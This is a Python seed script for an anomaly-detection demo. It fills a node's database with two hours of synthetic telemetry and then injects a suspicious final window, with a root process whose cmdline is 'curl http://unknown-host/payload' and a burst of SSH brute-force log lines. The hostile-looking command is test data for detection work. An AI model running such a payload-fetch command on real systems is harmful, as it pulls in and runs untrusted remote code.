"""
Backfills synthetic telemetry for a node so `POST /nodes/{id}/anomaly-scan`
has enough windows to fit on immediately, instead of waiting ~30 min for
real agent data to accumulate 6+ five-minute windows.

Writes ~24 windows of "normal" telemetry (CPU, RAM, disk, network I/O,
processes, connections, browser visits, system/auth logs) at 5-min
intervals going back 2 hours, then overwrites the most recent window with
an obvious spike (CPU pegged, a burst of new processes, and a cluster of
auth log lines from many distinct-looking sources) so the scan has
something concrete to flag.

Usage:
    python seed_anomaly_demo_data.py <node_id>

If you don't have a node yet, register one first via the agent, or check
`GET /nodes` to find an existing node_id.
"""
import sys
import random
import uuid
from datetime import datetime, timezone, timedelta

from app.db import SessionLocal
from app.models.node import Node
from app.models.cpu_snapshot import CpuSnapshot
from app.models.ram_snapshot import RamSnapshot
from app.models.disk_snapshot import DiskSnapshot
from app.models.network_io_snapshot import NetworkIoSnapshot
from app.models.process_snapshot import ProcessSnapshot
from app.models.active_connection import ActiveConnection
from app.models.visited_site import VisitedSite
from app.models.system_log import SystemLog
from app.models.auth_event import AuthEvent

WINDOWS_BACK = 24  # 24 * 5min = 2 hours of history
BUCKET_MINUTES = 5

random.seed(42)


def seed(node_id: int):
    db = SessionLocal()
    try:
        node = db.query(Node).filter(Node.id == node_id).first()
        if not node:
            print(f"No node with id={node_id}. Register one first, or check `GET /nodes`.")
            sys.exit(1)

        now = datetime.now(timezone.utc)
        # Align to a clean 5-min boundary so this lines up with the scan's bucketing.
        start = now - timedelta(minutes=now.minute % BUCKET_MINUTES, seconds=now.second, microseconds=now.microsecond)
        start -= timedelta(minutes=BUCKET_MINUTES * WINDOWS_BACK)

        rows_added = 0
        for i in range(WINDOWS_BACK):
            bucket_start = start + timedelta(minutes=BUCKET_MINUTES * i)
            is_last = i == WINDOWS_BACK - 1  # the injected anomaly

            # CPU: 1-min cadence, 5 points per bucket
            for m in range(BUCKET_MINUTES):
                ts = bucket_start + timedelta(minutes=m)
                cpu_val = 95.0 + random.uniform(-2, 2) if is_last else random.uniform(5, 25)
                db.add(CpuSnapshot(node_id=node_id, received_at=ts, cpu_percent_used=round(cpu_val, 1)))
                rows_added += 1

            # RAM / disk / network I/O — one point per bucket
            db.add(RamSnapshot(
                node_id=node_id, received_at=bucket_start,
                ram_used_gb=round(random.uniform(4, 8), 2), ram_available_gb=round(random.uniform(6, 10), 2),
                ram_percent_used=round(random.uniform(30, 50), 1),
            ))
            db.add(DiskSnapshot(
                node_id=node_id, received_at=bucket_start,
                disk_used_gb=42.5, disk_free_gb=178.2, disk_percent_used=19.3,
            ))
            db.add(NetworkIoSnapshot(
                node_id=node_id, received_at=bucket_start,
                bytes_sent_mb=round(random.uniform(0, 5), 2), bytes_recv_mb=round(random.uniform(0, 5), 2),
            ))
            rows_added += 3

            # New processes — spike on the injected window
            proc_count = 40 if is_last else random.randint(0, 3)
            for p in range(proc_count):
                db.add(ProcessSnapshot(
                    node_id=node_id, received_at=bucket_start,
                    pid=10000 + i * 100 + p, create_time=bucket_start.timestamp(),
                    name="suspicious_proc" if is_last else "bash",
                    username="root" if is_last else "palash",
                    cmdline="curl http://unknown-host/payload" if is_last else "bash",
                    status="running", cpu_percent=round(random.uniform(0, 5), 1),
                    memory_percent=round(random.uniform(0, 5), 1),
                ))
                rows_added += 1

            # Active connections — cluster of distinct remote IPs on the injected window
            batch_id = str(uuid.uuid4())
            conn_count = 25 if is_last else random.randint(2, 8)
            for c in range(conn_count):
                remote_ip = f"185.220.101.{c}" if is_last else f"10.0.0.{random.randint(1, 20)}"
                db.add(ActiveConnection(
                    node_id=node_id, batch_id=batch_id, received_at=bucket_start,
                    local_ip="192.168.1.10", local_port=random.randint(1024, 65535),
                    remote_ip=remote_ip, remote_port=random.choice([443, 22, 8080, 9001]),
                    status="ESTABLISHED", pid=1000 + c, process_name="sshd" if is_last else "chrome",
                ))
                rows_added += 1

            # Browser visits — normal windows only, quiet during the "attack"
            if not is_last and random.random() > 0.4:
                vbatch = str(uuid.uuid4())
                db.add(VisitedSite(
                    node_id=node_id, batch_id=vbatch, received_at=bucket_start,
                    domain="github.com", title="GitHub", last_visit_time=bucket_start.timestamp(),
                    url="https://github.com/PalashChitnavis/argus", browser="chrome", most_visited=0,
                ))
                rows_added += 1

            # System / auth logs — burst of auth events on the injected window (looks like brute force)
            sbatch = str(uuid.uuid4())
            db.add(SystemLog(node_id=node_id, batch_id=sbatch, received_at=bucket_start, log_line="systemd: normal operation"))
            rows_added += 1

            auth_count = 30 if is_last else random.randint(0, 1)
            abatch = str(uuid.uuid4())
            for a in range(auth_count):
                db.add(AuthEvent(
                    node_id=node_id, batch_id=abatch, received_at=bucket_start,
                    log_line=f"sshd: Failed password for root from 185.220.101.{a} port 22 ssh2",
                ))
                rows_added += 1

        db.commit()
        print(f"Seeded {rows_added} rows across {WINDOWS_BACK} five-minute windows for node_id={node_id}.")
        print(f"Window range: {start.isoformat()} .. {now.isoformat()}")
        print("The most recent window has an injected spike (CPU ~95%, 40 new processes, a burst of")
        print("auth failures from many distinct IPs) — the scan should flag it.")
        print(f"\nNow run: curl -s -X POST 'http://127.0.0.1:8000/nodes/{node_id}/anomaly-scan?hours=3' | python3 -m json.tool")
    finally:
        db.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python seed_anomaly_demo_data.py <node_id>")
        sys.exit(1)
    seed(int(sys.argv[1]))
